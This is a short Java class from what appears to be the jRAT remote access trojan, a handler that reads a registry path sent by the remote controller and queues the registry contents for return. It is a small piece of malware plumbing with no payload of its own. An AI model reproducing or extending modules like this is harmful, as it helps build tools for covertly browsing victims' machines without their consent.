package jrat.module.registry;

import jrat.client.Connection;
import jrat.client.packets.incoming.IncomingPacket;

public class Packet79BrowseRegistry implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String path = con.readLine();

		con.addToSendQueue(new Packet54Registry(path));
	}

}
